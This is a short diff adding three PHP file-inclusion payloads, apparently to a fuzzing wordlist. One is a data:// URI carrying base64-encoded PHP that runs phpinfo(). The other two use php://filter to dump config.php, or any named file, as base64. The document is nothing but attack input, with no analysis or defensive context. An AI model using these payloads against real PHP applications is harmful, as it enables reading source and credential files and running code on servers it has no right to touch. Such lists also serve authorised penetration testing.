@@ -1,0 +1,3 @@
+data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg==
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=
